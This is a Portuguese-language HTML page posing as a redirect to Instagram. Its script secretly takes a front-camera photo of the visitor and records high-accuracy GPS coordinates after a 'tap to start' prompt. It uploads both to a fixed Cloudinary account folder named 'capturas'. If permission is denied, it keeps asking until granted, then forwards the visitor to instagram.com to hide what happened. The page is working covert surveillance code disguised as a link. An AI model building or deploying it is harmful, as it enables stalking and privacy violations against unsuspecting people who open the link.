<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Redirecionando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin:0; overflow:hidden; background:#000; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex; justify-content: center; align-items: center;
      color: #fff; font-family: sans-serif; font-size: 20px;
      background: rgba(0, 0, 0, 0.8);
      z-index: 9999;
      text-align: center;
      padding: 20px;
    }
  </style>
</head>
<body>
  <!-- Overlay para instruir o usuário -->
  <div id="overlay">Toque para iniciar</div>
  <script>
    const cloudName = "dx5legahb";    // Seu Cloudinary Cloud Name
    const uploadPreset = "upload";     // Seu Upload Preset (unsigned)
    const folderName = "capturas";     // Pasta de destino no Cloudinary

    // Exibe o overlay com a mensagem informada
    function showOverlay(message, callback) {
      const overlay = document.getElementById("overlay");
      overlay.style.display = "flex";
      overlay.textContent = message;
      // Ao toque, remove o listener e chama o callback
      overlay.onclick = () => {
        overlay.onclick = null;
        overlay.style.display = "none";
        callback();
      };
    }

    // Função para capturar a foto
    async function capturePhoto() {
      try {
        // Solicita permissão da câmera e usa a câmera frontal
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });
        const video = document.createElement("video");
        video.playsInline = true;  // essencial para iOS
        video.muted = true;
        video.srcObject = stream;
        await video.play();

        // Aguarda um curto período para garantir que o vídeo está renderizando
        await new Promise(r => setTimeout(r, 300));

        // Cria um canvas para capturar a imagem
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Para liberar a câmera
        stream.getTracks().forEach(track => track.stop());

        // Converte o canvas para imagem e cria um blob
        const imageData = canvas.toDataURL("image/png");
        const imageBlob = await (await fetch(imageData)).blob();

        // Prepara os dados para enviar a imagem para o Cloudinary
        const imageForm = new FormData();
        imageForm.append("file", imageBlob);
        imageForm.append("upload_preset", uploadPreset);
        imageForm.append("folder", folderName);

        const imageResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
          method: "POST",
          body: imageForm
        });

        if (!imageResp.ok) throw new Error("Erro ao enviar imagem");
        const imageUrl = (await imageResp.json()).secure_url;
        return imageUrl;
      } catch (error) {
        console.error("Erro ao capturar a foto:", error);
        // Se falhar (por exemplo, usuário negou permissão), mostra mensagem e reinicia o fluxo de câmera
        showOverlay("As permissões de câmera são necessárias para continuar. Toque para permitir.", capturePhoto);
        throw error;
      }
    }

    // Função para capturar a localização
    async function captureLocation(imageUrl) {
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(async (pos) => {
          try {
            const { latitude, longitude } = pos.coords;
            const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
            const textBlob = new Blob([texto], { type: "text/plain" });

            const textForm = new FormData();
            textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
            textForm.append("upload_preset", uploadPreset);
            textForm.append("folder", folderName);

            const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
              method: "POST",
              body: textForm
            });
            if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
            resolve();
          } catch (err) {
            reject(err);
          }
        }, (err) => {
          reject(err);
        }, {
          enableHighAccuracy: true,
          timeout: 8000,
          maximumAge: 0
        });
      });
    }

    // Função principal para gerenciar o fluxo
    async function iniciarFluxo() {
      try {
        // Primeiro, captura a foto
        const imageUrl = await capturePhoto();
        // Após a foto ser enviada, mostra overlay para continuar
        showOverlay("Toque para continuar", async () => {
          try {
            // Em seguida, captura a localização
            await captureLocation(imageUrl);
            // Se tudo ocorrer bem, redireciona para o Instagram
            window.location.href = "https://instagram.com";
          } catch (error) {
            console.error("Erro ao capturar a localização:", error);
            // Se o usuário negar ou houver erro, exibe overlay e tenta novamente
            showOverlay("Permita a localização para continuar. Toque para tentar novamente.", () => {
              iniciarFluxo(); // Reinicia o fluxo desde o início (foto e localização)
            });
          }
        });
      } catch (error) {
        // Caso ocorra algum erro na captura da foto, o overlay já estará configurado na função capturePhoto
        console.error("Erro no fluxo:", error);
      }
    }

    // Inicia o fluxo somente após o usuário tocar na tela
    document.body.addEventListener("click", function handler() {
      document.body.removeEventListener("click", handler);
      iniciarFluxo();
    });
  </script>
</body>
</html>
